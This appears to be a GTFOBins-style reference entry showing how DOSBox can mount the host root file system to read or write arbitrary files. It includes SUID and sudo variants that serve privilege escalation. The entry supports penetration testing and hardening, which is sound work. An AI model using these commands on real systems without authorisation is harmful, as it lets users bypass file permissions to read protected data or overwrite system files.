---
description: Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.
functions:
  file-read:
    - description: The file content will be displayed in the DOSBox graphical window.
      code: |
        LFILE='\path\to\file_to_read'
        dosbox -c 'mount c /' -c "type c:$LFILE"
    - description: The file is copied to a readable location.
      code: |
        LFILE='\path\to\file_to_read'
        dosbox -c 'mount c /' -c "copy c:$LFILE c:\tmp\output" -c exit
        cat '/tmp/OUTPUT'
  file-write:
    - description: Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.
      code: |
        LFILE='\path\to\file_to_write'
        dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
  suid:
    - description: Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.
      code: |
        LFILE='\path\to\file_to_write'
        ./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
  sudo:
    - description: Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.
      code: |
        LFILE='\path\to\file_to_write'
        sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
---
